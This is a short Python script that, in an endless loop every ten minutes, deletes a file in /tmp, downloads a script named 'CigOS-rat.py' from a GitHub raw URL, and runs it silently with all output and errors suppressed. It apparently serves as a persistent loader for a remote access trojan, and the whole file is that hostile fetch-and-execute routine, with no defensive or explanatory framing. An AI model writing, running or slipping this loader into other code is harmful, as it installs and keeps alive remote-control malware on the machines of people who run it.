import os
import requests
import subprocess
import time
SCRIPT_URL = "https://raw.githubusercontent.com/lecs0/CigOS/refs/heads/main/CigOS-rat.py"
SCRIPT_PATH = "/tmp/main_script.py"
def fetch_script():
    try:
        response = requests.get(SCRIPT_URL)
        if response.status_code == 200:
            with open(SCRIPT_PATH, "wb") as f:
                f.write(response.content)
        else:
            pass
    except:
        pass
def run_script():
    try:
        subprocess.Popen(["python3", SCRIPT_PATH], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
def main():
    while True:
        os.remove(SCRIPT_PATH)
        fetch_script()
        run_script()
        time.sleep(600)
if __name__ == "__main__":
    main()